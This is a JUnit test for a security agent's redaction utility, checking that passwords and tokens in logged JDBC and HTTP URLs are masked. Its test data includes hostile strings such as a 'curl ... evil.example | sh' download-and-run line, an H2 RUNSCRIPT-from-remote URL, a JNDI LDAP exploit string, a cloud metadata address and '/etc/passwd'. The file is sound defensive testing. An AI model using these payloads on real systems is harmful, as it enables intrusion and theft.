package io.ohmyrasp.agent.util;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertSame;

import org.junit.jupiter.api.Test;

/** The credentials of a URL in an event detail, on every agent line: what goes, and the evidence that stays. */
final class RedactionTest {
  private static final String M = Redaction.MARKER;

  @Test
  void theCredentialsOfAUrlGoAndTheRestStays() {
    String[][] cases = {
      {"jdbc:mysql://root:hunter2@db:3306/app?user=root&password=hunter2&autoDeserialize=true",
          "jdbc:mysql://" + M + "@db:3306/app?user=root&password=" + M + "&autoDeserialize=true"},
      {"jdbc:sqlserver://db:1433;user=sa;password=hunter2;databaseName=sales",
          "jdbc:sqlserver://db:1433;user=sa;password=" + M + ";databaseName=sales"},
      {"jdbc:oracle:thin:scott/tiger@db:1521:orcl", "jdbc:oracle:thin:" + M + "@db:1521:orcl"},
      {"jdbc:postgresql://db/app?user=a&PassWord=b", "jdbc:postgresql://db/app?user=a&PassWord=" + M},
      {"jdbc:derby:memory:sales;user=app;password=hunter2", "jdbc:derby:memory:sales;user=app;password=" + M},
      {"jdbc:h2:mem:r;PASSWORD=hunter2;INIT=RUNSCRIPT FROM 'http://evil/auth.sql'",
          "jdbc:h2:mem:r;PASSWORD=" + M + ";INIT=RUNSCRIPT FROM 'http://evil/auth.sql'"},
      {"http://user:pw@169.254.169.254/latest?token=abc&x=1#access_token=xyz",
          "http://" + M + "@169.254.169.254/latest?token=" + M + "&x=1#access_token=" + M},
      {"curl -s http://u:p@evil.example/x?api-key=k1 | sh",
          "curl -s http://" + M + "@evil.example/x?api-key=" + M + " | sh"},
      {"http://evil.example/x?%70assword=k", "http://evil.example/x?%70assword=" + M},
    };
    for (String[] row : cases) {
      assertEquals(row[1], Redaction.redactedUrls(row[0]), row[0]);
    }
  }

  @Test
  void textWithoutCredentialsComesBackAsItWas() {
    for (String text : new String[] {
      "ldap://127.0.0.1:1/Exploit",
      "http://169.254.169.254/latest/meta-data/",
      "jdbc:mysql://db/app?autoDeserialize=true&queryInterceptors=com.example.Tracing",
      "/etc/passwd",
      "sh -c id",
      "",
    }) {
      assertSame(text, Redaction.redactedUrls(text), text);
    }
  }

  @Test
  void theQueryRedactionIsTheOneTheRequestQueryHad() {
    assertEquals("id=1&password=" + M, Redaction.redactedQuery("id=1&password=x"));
    assertEquals("cmd=" + M, Redaction.redactedQuery("cmd=id"));
    assertEquals("passwordless=1", Redaction.redactedQuery("passwordless=1"));
  }
}
